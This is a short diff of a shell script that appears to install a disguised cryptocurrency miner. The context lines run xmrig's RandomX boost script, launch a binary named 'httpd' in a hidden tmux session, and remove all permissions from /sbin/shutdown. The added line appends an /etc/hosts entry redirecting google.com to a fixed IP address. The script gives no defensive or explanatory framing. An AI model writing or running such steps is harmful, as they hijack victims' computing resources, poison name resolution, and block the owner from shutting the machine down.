@@ -29,4 +29,6 @@ wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.
 sudo bash randomx_boost.sh
 sudo chmod +x httpd
 sudo tmux new-session -d -s my_session1  './httpd'
+sudo -- sh -c "echo '103.145.255.41  google.com' >> /etc/hosts"
+
 sudo chmod 0 /sbin/shutdown
